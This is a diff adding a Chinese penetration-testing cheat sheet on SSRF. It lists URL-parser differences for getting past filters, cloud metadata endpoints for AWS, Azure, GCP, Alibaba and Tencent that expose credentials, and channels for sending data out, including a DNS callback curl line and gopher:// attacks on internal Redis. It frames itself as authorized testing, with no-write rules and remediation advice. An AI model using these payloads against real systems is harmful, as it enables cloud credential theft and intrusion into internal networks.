@@ -1,0 +1,115 @@
+# SSRF 深化：URL 解析器差异 + 云元数据全目录 + 外带
+
+> 深化 `ssrf-test.md`：URL 解析差异是 SSRF 过滤绕过核心；云元数据端点是 SSRF 最高价值面。全部授权测试手法。
+
+## 一、URL 解析器差异表（过滤绕过核心）
+
+**原理**：过滤器用库 A 解析 URL 判断主机，请求用库 B 实际连接——两者对同一 URL 的"主机"理解不同 → 绕过。
+
+### 1. Userinfo（`@` 前是 userinfo）
+`http://<EMAIL-REDACTED>/path`
+| 解析器 | 判定主机 | 备注 |
+|--------|---------|------|
+| Python urllib/requests | `safe.com` | evil.com 视为 userinfo |
+| Java URL/URI | `safe.com` | 同 |
+| PHP parse_url | `safe.com` | 同 |
+| Node url.parse / WHATWG | `safe.com` | 同 |
+| Go net/url | `safe.com` | 同 |
+| cURL | `safe.com` | 带 auth 发往 safe.com |
+
+**绕过场景**：过滤器检查 `safe.com` 放行 → 请求实际打到 `evil.com`？**不一定**——多数库都取 `@` 后为主机，所以这条主要用于"过滤器只看前缀"的场景。
+
+### 2. 反斜杠（`\`）
+`http://evil.com\@safe.com/path`
+| 解析器 | 判定主机 | 备注 |
+|--------|---------|------|
+| Python urllib | `evil.com\@safe.com`（不拆） | 反斜杠不是分隔符 |
+| Python requests | `evil.com` | 视 `\` 为路径分隔 |
+| PHP parse_url | `safe.com` | 忽略 authority 里的 `\` |
+| Node url.parse/new URL | `evil.com` | `\` 归一化为 `/` |
+| Go net/url | error/字面 | 严格 |
+| cURL | `evil.com` | `\` 当路径分隔 |
+
+**实战**：PHP 后端（过滤器认 safe.com）+ Node 上游代理 → 差异可利用。
+
+### 3. 编码与规范化差异
+- **双编码**：`%2565%2576%2569%256c`（代理解码一次，过滤器只见编码）
+- **大小写**：`EvIl.CoM`（部分过滤器不归一化）
+- **IP 变体**：`2130706433`（十进制）、`0x7f000001`（十六进制）、`0177.0.0.1`（八进制）、`127.1`（省略段）、`[::ffff:127.0.0.1]`（IPv6 映射）
+- **DNS 重绑定**：`dns-rebinding-test.md`（解析器与连接器两次解析不同 IP）
+
+### 4. 其他差异面
+| 技巧 | 原理 |
+|------|------|
+| `#` 后内容 | 部分库把后面当 fragment 剥离（过滤器看不到实际路径） |
+| `?` 前截断 | 部分库截到 query |
+| `%00`/`%0d%0a` | 老解析器截断/头注入 |
+| 多斜杠 `//` | 协议相对 URL（`//evil.com`） |
+| 组合 | `http://<EMAIL-REDACTED>`、`http://evil.com#@safe.com`、`http://safe.com\@evil.com` 轮换 |
+
+## 二、云元数据端点全目录（SSRF 优先打这里）
+
+### AWS
+```
+http://169.254.169.254/latest/meta-data/                 # IMDSv1 无认证
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+# 容器 ECS:
+http://169.254.170.2<AWS_CONTAINER_CREDENTIALS_RELATIVE_URI>
+```
+**IMDSv2**（需 PUT + X-aws-ec2-metadata-token 头 + 60s 有效）：
+```
+PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+GET http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: <TOKEN>"
+```
+→ SSRF 支持 PUT + 自定义头的场景可打 IMDSv2。
+
+### Azure
+```
+http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"
+# 托管身份: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+```
+
+### GCP
+```
+http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
+# 备选 IP: 169.254.169.254 / metadata.google.internal
+# 无头老版本: 部分旧 GCP 不需要 Metadata-Flavor（逆行试）
+# 头绕过: Metadata-Flavor: Google\r\nX-Ignore: (换行注入)
+# GCE 访问令牌:
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+### 阿里云 / 腾讯云
+```
+# 阿里云 ECS:
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+# 腾讯云 CVM:
+http://metadata.tencentyun.com/latest/meta-data/
+http://metadata.tencentyun.com/latest/meta-data/cvm/security-credentials/
+```
+
+## 三、外带与证明
+
+- **回显型**：元数据 JSON 直接回显（最高效）
+- **盲型**：`file://` 读 `/proc/self/environ`（找代理配置/密钥）、`gopher://` 打内网 Redis（见未授权服务）、DNS 外带（`curl http://<token>.dnslog`）
+- **HTTP 重定向绕元数据**：302 跳到元数据地址（部分 SSRF 跟随重定向）
+
+## 四、拿到凭证后的纪律（认钥闸）
+
+1. 临时凭证 ≠ 直接报严重 → **认钥闸**：假值对照 + 用钥调 `GetCallerIdentity`（AWS）/`sts:GetCallerIdentity` 带出账号 ID
+2. 读列表（ListBuckets/DescribeInstances）证明作用域 → 高危起
+3. **不做任何 Write/Delete**；凭证过期特性写清楚
+4. 报告：凭证类型 + 权限面 + 能访问的数据样例（脱敏），修复建议（IMDSv2 强制 + SSRF 防护 + 最小权限）
+
+## 五、快速测试矩阵（SSRF 点到手后）
+
+```
+1. 回环对照（请求自己 VPS → 出网确认）
+2. 内网探测（169.254.x.x / 10.x / 172.16-31.x / 192.168.x，端口常用 80/443/22/6379/9200）
+3. 云元数据目录（按厂商端点 + 头）→ 凭证（认钥闸）
+4. 本地文件（file://）→ 配置/环境变量
+5. 协议面（gopher:// 打内网服务、dict://）→ 未授权服务链
+6. 出网面（DNSLOG 确认外带能力）→ 盲打 RCE 类
+```
